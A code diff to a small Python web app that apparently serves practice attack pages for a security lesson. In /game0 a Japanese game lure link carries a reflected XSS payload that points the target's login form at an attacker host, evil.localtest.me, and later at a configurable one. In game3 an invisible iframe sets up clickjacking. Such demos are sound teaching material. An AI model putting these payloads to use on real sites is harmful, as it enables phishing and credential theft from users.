@@ -48,8 +48,9 @@ def add_user():
 
 @route('/game0')
 def show_game0():
-    return '''
-<p>楽しいゲームで遊ぶには、<a target="_blank" href="http://localhost:8080/login?message=<script>window.onload=function(){document.querySelector('form').action='http://evil.localtest.me:8081/users'}</script>">ここをクリック</a>してね！</p>'''
+    return template('''
+<p>楽しいゲームで遊ぶには、<a target="_blank" href="{{ url }}/login?message=<script>window.onload=function(){document.querySelector('form').action='http://{{ host }}:{{ port }}/users'}</script>">ここをクリック</a>してね！</p>
+    ''', url=TARGET_URL, host=HOST, port=PORT)
 
 @route('/game1')
 def show_game1():
@@ -88,7 +89,7 @@ def show_game3():
 <script>function invisible(checked) {
     const iframe = document.querySelector('iframe');
     if (checked) {
-        iframe.style = 'opacity:0; filter:alpha(opacity=0);';
+        iframe.style = 'opacity:0.001; filter:alpha(opacity=0.001);';
     } else {
         iframe.style = '';
     }
